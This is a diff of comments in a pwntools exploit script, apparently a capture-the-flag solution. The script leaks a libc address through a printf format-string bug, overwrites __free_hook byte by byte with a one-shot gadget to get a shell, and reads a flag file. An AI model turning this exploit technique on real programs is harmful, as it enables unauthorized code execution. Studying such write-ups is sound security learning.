@@ -2,15 +2,14 @@ from pwn import *
 #context.log_level='debug'
 
 # Theres a printf vulnerability that leaks where the input buffer
-# is, and the address of libc's read+0x11
+# is, and some libc address
 
-# first of all, you need the libc that they are using
+# First of all, you need the libc that they are using
 # Thankfully, the binary has PIE disabled, so we can just leak
-# a GOT address like puts/alarm and see if search it up
-# in libc-database
+# a GOT address like puts/alarm and search it up in libc-database
 
 # The aim is to leak libc, then change __malloc_hook/__free_hook to
-# point to our magic gadget
+# point to our magic gadget in libc
 
 # we are going to write to _free_hook (_malloc_hook is called by
 # something in puts() or something, so replacing it byte-by-byte
@@ -53,7 +52,7 @@ print(hex(magic_gadget))
 print(hex(return_addr))
 
 # Write to __free_hook byte by byte
-# 6 instead of 8 as we are on a time limit,
+# 6 instead of 8 as we are on a time limit (alarm),
 # and the last 2 bytes are \x00 anyway
 for i in range(6):
     addr_to_write = p64(return_addr+i)
@@ -65,5 +64,7 @@ for i in range(6):
 r.sendline("%100000c")
 
 #success('PID '+str( r.pid))
+# since we are on a time limit, get the flag quick
 r.sendline('cat /thecoven/flag')
+# also prints out the flag here
 r.interactive()
